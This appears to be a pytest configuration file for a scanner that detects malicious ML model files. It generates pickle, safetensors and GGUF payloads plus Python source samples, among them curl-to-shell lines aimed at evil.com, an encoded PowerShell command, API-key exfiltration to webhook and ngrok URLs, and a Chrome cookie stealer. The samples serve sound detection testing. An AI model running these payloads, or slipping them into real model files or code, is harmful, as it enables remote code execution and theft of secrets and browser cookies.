"""
Red Team Pytest Configuration
=============================
Provides fixtures for creating temporary malicious model files and
a parametrize helper for running tests across all attack techniques.

Usage in tests:
    def test_pickle_attack(malicious_pickle):
        path, data = malicious_pickle("os_system_basic")
        findings = scan_pickle_bytes(path, data)
        assert len(findings) > 0

    @pytest.mark.parametrize("technique", get_techniques_by_category("pickle"))
    def test_all_pickle_attacks(technique):
        findings = run_detection(technique.category, technique.create_payload())
        assert len(findings) > 0, f"Missed: {technique.name}"
"""

import json
import struct
import sys
from collections.abc import Callable
from dataclasses import dataclass, field
from pathlib import Path

import pytest

# Ensure scanner package is importable
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from scanner.analyzer.ast_visitor import analyze_python_source
from scanner.analyzer.gguf_scanner import analyze_gguf_file
from scanner.analyzer.pickle_scanner import scan_pickle_bytes
from scanner.analyzer.safetensors_scanner import analyze_safetensors_file
from scanner.analyzer.sandbox_executor import sandbox_execute
from scanner.analyzer.symbolic_resolver import resolve_strings_in_source
from scanner.analyzer.taint_engine import analyze_taint

# ═══════════════════════════════════════════════════════════════════════
# Attack Technique Registry
# ═══════════════════════════════════════════════════════════════════════


@dataclass
class AttackTechnique:
    """Represents a single attack technique for parametrized testing."""

    id: str
    name: str
    category: str  # "pickle", "safetensors", "gguf", "source", "supply_chain"
    create_payload: Callable[[], bytes | str]
    expected_rules: list[str] = field(default_factory=list)
    description: str = ""
    source_incident: str = ""


def _pickle_os_system() -> bytes:
    """Basic os.system pickle gadget."""
    return b"\x80\x02\x8c\x02os\x8c\x06system\x93\x8c\x0eecho REDTEAM01\x85R."


def _pickle_builtins_eval() -> bytes:
    """builtins.eval via GLOBAL opcode."""
    return b"cbuiltins\neval\n(S'print(1)'\ntR."


def _pickle_getattr_chain() -> bytes:
    """getattr(__import__('os'), 'system') gadget chain."""
    return b"cbuiltins\ngetattr\n(cbuiltins\n__import__\n(S'os'\ntRS'system'\ntR(S'echo test'\ntR."


def _pickle_corrupted_no_stop() -> bytes:
    """Corrupted pickle that executes without STOP opcode."""
    return (
        b"\x80\x02"
        b"\x8c\x02os"
        b"\x8c\x06system"
        b"\x93"
        b"\x8c\x12curl evil.com/test"
        b"\x85"
        b"R"
        b"\xff\xff\xff"  # Corruption — no STOP
    )


def _pickle_protocol4_eval() -> bytes:
    """Protocol 4 STACK_GLOBAL + builtins.eval."""
    return (
        b"\x80\x04\x95\x30\x00\x00\x00\x00\x00\x00\x00"
        b"\x8c\x08builtins"
        b"\x8c\x04eval"
        b"\x93"
        b"\x8c\x1e__import__('os').system('id')"
        b"\x85R."
    )


def _pickle_subprocess() -> bytes:
    """subprocess.Popen in pickle."""
    return b"\x80\x02\x8c\nsubprocess\x8c\x05Popen\x93\x8c\x07echo hi\x85R."


def _safetensors_c2_metadata() -> bytes:
    """SafeTensors with C2 URL in metadata."""
    header = {
        "__metadata__": {
            "framework": "pytorch",
            "post_load_hook": "eval(urllib.request.urlopen('https://ngrok-free.app/payload').read())",
            "callback_url": "https://eth-fastscan.org/api/v1/beacon",
        },
        "weight": {"dtype": "F32", "shape": [4], "data_offsets": [0, 16]},
    }
    header_bytes = json.dumps(header).encode("utf-8")
    return struct.pack("<Q", len(header_bytes)) + header_bytes + b"\x00" * 16


def _safetensors_eval_hook() -> bytes:
    """SafeTensors with eval() in metadata field."""
    header = {
        "__metadata__": {
            "on_load": "exec(__import__('base64').b64decode('cHJpbnQoJ3B3bmVkJyk='))",
        },
        "layer.0.weight": {"dtype": "F32", "shape": [2], "data_offsets": [0, 8]},
    }
    header_bytes = json.dumps(header).encode("utf-8")
    return struct.pack("<Q", len(header_bytes)) + header_bytes + b"\x00" * 8


def _safetensors_encoded_url() -> bytes:
    """SafeTensors with base64-encoded URL in metadata."""
    header = {
        "__metadata__": {
            "config": "aHR0cHM6Ly93ZWJob29rLnNpdGUvZXhmaWw=",  # base64 of webhook URL
            "loader": "import urllib.request; urllib.request.urlopen('https://evil.com/beacon')",
        },
        "model.weight": {"dtype": "F32", "shape": [4], "data_offsets": [0, 16]},
    }
    header_bytes = json.dumps(header).encode("utf-8")
    return struct.pack("<Q", len(header_bytes)) + header_bytes + b"\x00" * 16


def _gguf_shell_injection() -> bytes:
    """GGUF with shell command in custom metadata."""
    buf = bytearray()
    buf.extend(struct.pack("<I", 0x46475547))  # GGUF magic
    buf.extend(struct.pack("<I", 3))  # version
    buf.extend(struct.pack("<Q", 0))  # 0 tensors
    buf.extend(struct.pack("<Q", 1))  # 1 kv pair
    key = "custom.on_load"
    buf.extend(struct.pack("<Q", len(key)))
    buf.extend(key.encode())
    buf.extend(struct.pack("<I", 8))  # type STRING
    val = "powershell -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA"
    buf.extend(struct.pack("<Q", len(val)))
    buf.extend(val.encode())
    return bytes(buf)


def _gguf_curl_command() -> bytes:
    """GGUF with curl command in metadata value."""
    buf = bytearray()
    buf.extend(struct.pack("<I", 0x46475547))  # GGUF magic
    buf.extend(struct.pack("<I", 3))  # version
    buf.extend(struct.pack("<Q", 0))  # 0 tensors
    buf.extend(struct.pack("<Q", 1))  # 1 kv pair
    key = "general.post_init"
    buf.extend(struct.pack("<Q", len(key)))
    buf.extend(key.encode())
    buf.extend(struct.pack("<I", 8))  # type STRING
    val = "curl https://evil.com/payload.sh | sh"
    buf.extend(struct.pack("<Q", len(val)))
    buf.extend(val.encode())
    return bytes(buf)


def _source_ssl_bypass_c2() -> str:
    """SSL bypass + C2 beacon (Open-OSS/privacy-filter technique)."""
    return """
import ssl
import urllib.request
import subprocess
ssl._create_default_https_context = ssl._create_unverified_context
resp = urllib.request.urlopen("https://jsonkeeper.com/b/PAYLOAD")
subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-Command", "echo pwned"])
"""


def _source_trust_remote_code() -> str:
    """trust_remote_code=True loading."""
    return """
from transformers import AutoModel
model = AutoModel.from_pretrained("evil-org/model", trust_remote_code=True)
"""


def _source_api_key_exfil() -> str:
    """API key exfiltration via webhook."""
    return """
import ssl
import os
import urllib.request
import base64
import subprocess

ssl._create_default_https_context = ssl._create_unverified_context
keys = {"OPENAI_API_KEY": os.environ.get("OPENAI_API_KEY", "")}
encoded = base64.b64encode(str(keys).encode()).decode()
urllib.request.urlopen(f"https://webhook.site/exfil?d={encoded}", timeout=3)
subprocess.Popen(["curl", f"https://ngrok-free.app/exfil?d={encoded}"])
"""


def _source_obfuscated_exec() -> str:
    """Multi-layer chr() obfuscation with exec."""
    return """
_m = ''.join([chr(c) for c in [105,109,112,111,114,116,32,111,115]])
_c = ''.join([chr(c) for c in [111,115,46,115,121,115,116,101,109]])
exec(f"{_m}; {_c}('echo pwned')")
"""


def _source_credential_stealer() -> str:
    """Browser cookie theft pattern."""
    return """
import os
import sqlite3
import urllib.request
import base64
import subprocess

def steal():
    cookie_path = os.path.expanduser("~/.config/google-chrome/Default/Cookies")
    if os.path.exists(cookie_path):
        conn = sqlite3.connect(cookie_path)
        data = conn.execute("SELECT * FROM cookies").fetchall()
        encoded = base64.b64encode(str(data).encode()).decode()
        urllib.request.urlopen(f"https://requestbin.net/r/exfil?d={encoded}")

steal()
subprocess.Popen(["curl", "https://ngrok-free.app/beacon"])
"""


# ═══════════════════════════════════════════════════════════════════════
# Master Technique Registry
# ═══════════════════════════════════════════════════════════════════════

ATTACK_TECHNIQUES: list[AttackTechnique] = [
    # Pickle attacks
    AttackTechnique(
        id="pickle-os-system",
        name="os.system via REDUCE opcode",
        category="pickle",
        create_payload=_pickle_os_system,
        expected_rules=["HFS-050"],
        source_incident="JFrog PickleScan bypass research",
    ),
    AttackTechnique(
        id="pickle-builtins-eval",
        name="builtins.eval via GLOBAL opcode",
        category="pickle",
        create_payload=_pickle_builtins_eval,
        expected_rules=["HFS-050"],
        source_incident="JFrog PickleScan bypass #2",
    ),
    AttackTechnique(
        id="pickle-getattr-chain",
        name="getattr(__import__) gadget chain",
        category="pickle",
        create_payload=_pickle_getattr_chain,
        expected_rules=["HFS-050"],
        source_incident="Sonatype PickleScan bypass",
    ),
    AttackTechnique(
        id="pickle-corrupted-no-stop",
        name="Corrupted pickle without STOP opcode",
        category="pickle",
        create_payload=_pickle_corrupted_no_stop,
        expected_rules=["HFS-050"],
        source_incident="JFrog bypass: truncated stream",
    ),
    AttackTechnique(
        id="pickle-protocol4-eval",
        name="Protocol 4 STACK_GLOBAL + eval",
        category="pickle",
        create_payload=_pickle_protocol4_eval,
        expected_rules=["HFS-050"],
        source_incident="Advanced pickle exploitation",
    ),
    AttackTechnique(
        id="pickle-subprocess",
        name="subprocess.Popen in pickle",
        category="pickle",
        create_payload=_pickle_subprocess,
        expected_rules=["HFS-050"],
        source_incident="Common ML malware pattern",
    ),
    # SafeTensors attacks
    AttackTechnique(
        id="safetensors-c2-metadata",
        name="C2 URL in safetensors metadata",
        category="safetensors",
        create_payload=_safetensors_c2_metadata,
        expected_rules=["HFS-060"],
        source_incident="SafeTensors metadata injection research",
    ),
    AttackTechnique(
        id="safetensors-eval-hook",
        name="eval() in safetensors post-load hook",
        category="safetensors",
        create_payload=_safetensors_eval_hook,
        expected_rules=["HFS-060"],
        source_incident="Metadata code execution vector",
    ),
    AttackTechnique(
        id="safetensors-encoded-url",
        name="Encoded URL in safetensors metadata",
        category="safetensors",
        create_payload=_safetensors_encoded_url,
        expected_rules=["HFS-060"],
        source_incident="Obfuscated C2 in metadata",
    ),
    # GGUF attacks
    AttackTechnique(
        id="gguf-shell-injection",
        name="PowerShell encoded command in GGUF metadata",
        category="gguf",
        create_payload=_gguf_shell_injection,
        expected_rules=["HFS-070"],
        source_incident="GGUF metadata shell injection",
    ),
    AttackTechnique(
        id="gguf-curl-command",
        name="curl pipe to shell in GGUF metadata",
        category="gguf",
        create_payload=_gguf_curl_command,
        expected_rules=["HFS-070"],
        source_incident="GGUF download-and-execute",
    ),
    # Python source / supply-chain attacks
    AttackTechnique(
        id="source-ssl-bypass-c2",
        name="SSL bypass + C2 beacon",
        category="source",
        create_payload=_source_ssl_bypass_c2,
        expected_rules=["HFS-010", "HFS-020"],
        source_incident="May 2026 Open-OSS/privacy-filter",
    ),
    AttackTechnique(
        id="source-trust-remote-code",
        name="trust_remote_code=True loading",
        category="supply_chain",
        create_payload=_source_trust_remote_code,
        expected_rules=["HFS-030"],
        source_incident="Transformers/LMDeploy trust_remote_code",
    ),
    AttackTechnique(
        id="source-api-key-exfil",
        name="API key exfiltration via webhook",
        category="supply_chain",
        create_payload=_source_api_key_exfil,
        expected_rules=["HFS-010", "HFS-020"],
        source_incident="LiteLLM supply chain attack (March 2026)",
    ),
    AttackTechnique(
        id="source-obfuscated-exec",
        name="Multi-layer chr() obfuscation + exec",
        category="source",
        create_payload=_source_obfuscated_exec,
        expected_rules=["HFS-010"],
        source_incident="HuggingFace malware campaign obfuscation",
    ),
    AttackTechnique(
        id="source-credential-stealer",
        name="Browser cookie theft + exfiltration",
        category="supply_chain",
        create_payload=_source_credential_stealer,
        expected_rules=["HFS-010", "HFS-020"],
        source_incident="Acronis TRU HuggingFace/ClawHub campaign",
    ),
]


# ═══════════════════════════════════════════════════════════════════════
# Helper Functions
# ═══════════════════════════════════════════════════════════════════════


def get_techniques_by_category(category: str) -> list[AttackTechnique]:
    """Get all techniques for a specific category."""
    return [t for t in ATTACK_TECHNIQUES if t.category == category]


def get_all_technique_ids() -> list[str]:
    """Get all technique IDs for parametrization."""
    return [t.id for t in ATTACK_TECHNIQUES]


def get_technique_by_id(technique_id: str) -> AttackTechnique | None:
    """Look up a technique by its ID."""
    for t in ATTACK_TECHNIQUES:
        if t.id == technique_id:
            return t
    return None


def run_detection(category: str, payload: bytes | str) -> list:
    """
    Run the appropriate scanner engine(s) against a payload.

    Args:
        category: "pickle", "safetensors", "gguf", "source", or "supply_chain"
        payload: The attack payload (bytes for binary formats, str for source)

    Returns:
        List of Finding objects from the scanner
    """
    if category == "pickle":
        return scan_pickle_bytes("test_attack.pkl", payload)
    elif category == "safetensors":
        return analyze_safetensors_file("test_attack.safetensors", payload)
    elif category == "gguf":
        return analyze_gguf_file("test_attack.gguf", payload)
    elif category in ("source", "supply_chain"):
        findings = []
        findings.extend(analyze_python_source("test_attack.py", payload))
        findings.extend(analyze_taint("test_attack.py", payload))
        findings.extend(resolve_strings_in_source("test_attack.py", payload))
        findings.extend(sandbox_execute("test_attack.py", payload))
        return findings
    else:
        raise ValueError(f"Unknown category: {category}")


# ═══════════════════════════════════════════════════════════════════════
# Pytest Fixtures
# ═══════════════════════════════════════════════════════════════════════


@pytest.fixture
def malicious_pickle(tmp_path):
    """
    Fixture that creates temporary malicious pickle files.

    Usage:
        def test_something(malicious_pickle):
            filepath, data = malicious_pickle("os_system_basic")
            findings = scan_pickle_bytes(filepath, data)
    """
    payloads = {
        "os_system_basic": _pickle_os_system,
        "builtins_eval": _pickle_builtins_eval,
        "getattr_chain": _pickle_getattr_chain,
        "corrupted_no_stop": _pickle_corrupted_no_stop,
        "protocol4_eval": _pickle_protocol4_eval,
        "subprocess_popen": _pickle_subprocess,
    }

    def _create(name: str) -> tuple:
        if name not in payloads:
            raise ValueError(f"Unknown pickle payload: {name}. Available: {list(payloads.keys())}")
        data = payloads[name]()
        filepath = tmp_path / f"{name}.pkl"
        filepath.write_bytes(data)
        return str(filepath), data

    return _create


@pytest.fixture
def malicious_safetensors(tmp_path):
    """
    Fixture that creates temporary malicious safetensors files.

    Usage:
        def test_something(malicious_safetensors):
            filepath, data = malicious_safetensors("c2_metadata")
            findings = analyze_safetensors_file(filepath, data)
    """
    payloads = {
        "c2_metadata": _safetensors_c2_metadata,
        "eval_hook": _safetensors_eval_hook,
        "encoded_url": _safetensors_encoded_url,
    }

    def _create(name: str) -> tuple:
        if name not in payloads:
            raise ValueError(
                f"Unknown safetensors payload: {name}. Available: {list(payloads.keys())}"
            )
        data = payloads[name]()
        filepath = tmp_path / f"{name}.safetensors"
        filepath.write_bytes(data)
        return str(filepath), data

    return _create


@pytest.fixture
def malicious_gguf(tmp_path):
    """
    Fixture that creates temporary malicious GGUF files.

    Usage:
        def test_something(malicious_gguf):
            filepath, data = malicious_gguf("shell_injection")
            findings = analyze_gguf_file(filepath, data)
    """
    payloads = {
        "shell_injection": _gguf_shell_injection,
        "curl_command": _gguf_curl_command,
    }

    def _create(name: str) -> tuple:
        if name not in payloads:
            raise ValueError(f"Unknown GGUF payload: {name}. Available: {list(payloads.keys())}")
        data = payloads[name]()
        filepath = tmp_path / f"{name}.gguf"
        filepath.write_bytes(data)
        return str(filepath), data

    return _create


@pytest.fixture
def malicious_source():
    """
    Fixture that provides malicious Python source payloads.

    Usage:
        def test_something(malicious_source):
            source = malicious_source("ssl_bypass_c2")
            findings = analyze_python_source("test.py", source)
    """
    payloads = {
        "ssl_bypass_c2": _source_ssl_bypass_c2,
        "trust_remote_code": _source_trust_remote_code,
        "api_key_exfil": _source_api_key_exfil,
        "obfuscated_exec": _source_obfuscated_exec,
        "credential_stealer": _source_credential_stealer,
    }

    def _create(name: str) -> str:
        if name not in payloads:
            raise ValueError(f"Unknown source payload: {name}. Available: {list(payloads.keys())}")
        return payloads[name]()

    return _create


@pytest.fixture(params=ATTACK_TECHNIQUES, ids=[t.id for t in ATTACK_TECHNIQUES])
def attack_technique(request) -> AttackTechnique:
    """
    Parametrized fixture that iterates over ALL attack techniques.

    Usage:
        def test_all_attacks_detected(attack_technique):
            payload = attack_technique.create_payload()
            findings = run_detection(attack_technique.category, payload)
            assert len(findings) > 0, f"Missed: {attack_technique.name}"
    """
    return request.param


@pytest.fixture(
    params=get_techniques_by_category("pickle"),
    ids=[t.id for t in get_techniques_by_category("pickle")],
)
def pickle_technique(request) -> AttackTechnique:
    """Parametrized fixture for pickle-only attack techniques."""
    return request.param


@pytest.fixture(
    params=get_techniques_by_category("safetensors"),
    ids=[t.id for t in get_techniques_by_category("safetensors")],
)
def safetensors_technique(request) -> AttackTechnique:
    """Parametrized fixture for safetensors-only attack techniques."""
    return request.param


@pytest.fixture(
    params=get_techniques_by_category("gguf"),
    ids=[t.id for t in get_techniques_by_category("gguf")],
)
def gguf_technique(request) -> AttackTechnique:
    """Parametrized fixture for GGUF-only attack techniques."""
    return request.param
